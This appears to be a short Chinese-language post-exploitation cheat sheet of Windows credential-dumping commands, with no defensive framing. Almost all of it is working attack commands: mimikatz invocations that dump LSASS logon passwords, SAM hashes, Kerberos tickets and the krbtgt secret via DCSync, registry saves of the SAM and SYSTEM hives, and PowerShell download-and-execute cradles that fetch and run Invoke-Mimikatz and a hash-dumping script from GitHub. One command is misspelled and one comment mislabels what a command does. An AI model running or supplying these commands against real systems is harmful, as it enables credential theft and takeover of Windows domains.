### 非交互场景

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" > pssword.txt
```

```bash
reg save hklm\sam sam.hive
reg save hklm\system system.hive
mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive"
```



### 交互式场景

```bash
cmd> reg save hklm\sam sam.hive
cmd> reg save hklm\system system.hive

mimikatz(commandline) # privilege::debug
mimikatz(commandline) # sekurlsa::logonpasswords
mimikatz(commandline) # token::elevate
mimikatz(commandline) # sekurlsa::tickets           <-- 导出票据
mimikatz(commandline) # kerberos::list /export      <-- 导出凭证
mimikatz(commandline) # lsadump::sam /sam:sam.hive /system:system.hive   <-- 读内存密码
mimikatz(commandline) # lsadump::dcsync /user:krbtgt    <-- DCSync 凭证
mimikatz(commandline) # llsadump::lsa /inject /name:krbtgt    <-- DCSync 凭证
mimikatz(commandline) # sekurlsa::minidump lsass.dmp       <-- Lsass 内存转储


powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

powershell IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1');Get-PassHashes
```
